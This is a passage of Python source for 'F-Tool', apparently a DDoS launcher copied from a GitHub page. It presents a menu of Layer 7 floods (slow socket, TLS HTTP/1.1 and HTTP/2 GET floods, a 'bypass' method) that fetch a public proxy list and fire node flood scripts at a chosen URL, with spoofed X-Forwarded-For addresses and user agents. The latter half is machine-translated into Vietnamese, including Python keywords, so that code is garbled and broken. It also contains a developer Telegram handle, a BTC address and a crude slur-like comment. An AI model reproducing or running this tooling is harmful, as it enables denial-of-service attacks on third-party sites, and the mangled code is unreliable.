				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option == '00' or option == '0':
				os.system('clear');self.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def l7(self):
		print(f"""{Color.LG}
     __                      _____
    / /  __ _ _   _  ___ _ _|___  |
   / /  / _` | | | |/ _ \ '__| / /
  / /__| (_| | |_| |  __/ |   / /
  \____/\__,_|\__, |\___|_|  /_/
              |___/
""")
		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Slow HTTP/1.1 socket flood (JS)")
		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1: TLS HTTP/1.1 GET flood (JS)")
		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP2: TLS HTTP/2 GET flood (JS)")
		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Powerful Method Target Maybe die from Cringe (JS)")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
					F_Tool.styleText("\n [*] Downloading Proxy...\n")
					with open("utils/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '02' or option == '2':
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.styleText("\n [*] Downloading Proxy...\n")
					with open("utils/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '03' or option == '3':
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.styleText("\n [*] Downloading Proxy...\n")
					with open("utils/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '04' or option == '4':
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					F_Tool.styleText("\n [*] Downloading Proxy...\n")
					with open("utils/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
					print(Color.LG+f"\n [!] Attack sent successfully!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == 'ref' or option == 'REF':
				self.l7()
			elif option == 'home' or option == 'HOME':
				F_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.l7()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'dev' or option == 'DEV':
				print(self.dev)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option == '00' or option == '0':
				os.system('clear');self.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")


def spoof_useragents():
	spoof_ip = []
	ip = []
	ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
	ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)

	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
	spoof_ip.append(IP)

	useragents = ['Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)',
	'Chrome/34.0.1847.116 Safari/537.36',
	'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla / 5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit / 533.20.25 (KHTML, như Gecko) Phiên bản / 5.0.3 Safari / 533.19.4' ,
	'Mozilla / 5.0 (Windows; U; Windows NT 6.1; en-US; rv: 1.9.2.13) Gecko / 20101213 Opera / 9.80 (Windows NT 6.1; U; zh-tw) Phiên bản Presto / 2.7.62 / 11.01' ]

	trở lại {
	'Kết nối' : 'Keep-Alive' ,
	'Cache-control' : 'no-cache' ,
	'Tác nhân người dùng' : ngẫu nhiên . sự lựa chọn ( useragents ). dải (),
	'X-Forwarded-For' : ngẫu nhiên . lựa chọn ( spoof_ip )
	}

def  main ():
	# kiểm tra xem bạn có phải là người đồng tính không 😏
	F_Tool . styleText ( "[+] Kiểm tra sự phụ thuộc ... \ n \ n " )
	pkgs  = [ 'screen' , 'node' ]
	cài đặt  =  Đúng
	cho  pkg tính  bằng  pkgs :
		ur_mom  =  which ( pkg )
		if  ur_mom  ==  Không có :
			F_Tool . styleText ( f "[!] { pkg } chưa được cài đặt! \ n " )
			cài đặt  =  Sai
		khác :
			đi qua
	nếu  cài đặt  ==  Sai :
		sys . exit ( f ' \ n [?] Lỗi? hãy thử: { Color . LG } sh install.sh' )
	khác : vượt qua
	thử :
		script  =  True
		với  open ( 'utils' ) là  quan trọng : vượt qua
	ngoại trừ  IsADirectoryError : vượt qua
	ngoại trừ  FileNotFoundError :
		print ( f " { Color . LR } [CRITICAL ERROR]: { Color . RESET } Tệp: 'utils' NotFound" )
		print ( " \ n [+] Vui lòng tải xuống trên GitHub hoặc git clone: ​​https://github.com/FDc0d3/F-Tool.git \ n " )
		hệ điều hành . loại bỏ ( f ' { __file__ } ' )
		script  =  Sai
	if  script  ==  Sai : sys . thoát ra ()
	khác : vượt qua
	F_Tool . nhà ()


nếu  __name__  ==  '__main__' :
	Lệnh  =  f "" " { Màu . LC } HOME { Màu . LR } ~> { Màu . LY } Quay lại trang chủ
{ Màu sắc . LC } REF { Màu . LR } ~> { Màu sắc . LY } Làm mới menu
{ Màu sắc . LC } CLEAR { Màu . LR } ~> { Màu sắc . LY } Xóa khuôn mặt của bạn xd
{ Màu sắc . LC } EXIT { Màu . LR } ~> { Màu sắc . LY } Thoát khỏi chương trình
{ Màu sắc . LC } STOP { Màu . LR } ~> { Màu sắc . LY } Dừng cuộc tấn công của bạn
{ Màu sắc . LC } DEV { Màu sắc . LR } ~> { Màu sắc . LY } Liên hệ / Hỗ trợ nhà phát triển "" "
	dev  =  f "" " { Color . LC } Telegram { Color . LR } : { Color . LY } https://t.me/FDc0d3
{ Màu sắc . LC } Địa chỉ [BTC] mới { Màu . LR } : { Màu sắc . LY } 32FGCnt4uwkkByWuH8V4qyCSfynm1iVsmB "" "
	F_Tool  =  Trang chủ ( lệnh , nhà phát triển )
	Tool  =  Công cụ ( lệnh , nhà phát triển , spoof_useragents ())
	main ()
Chân trang
© 2022 GitHub, Inc.
Điều hướng chân trang
Điều kiện
Sự riêng tư
Bảo vệ
Trạng thái
Docs
Liên hệ với GitHub
Định giá
API
Tập huấn
Blog
Về
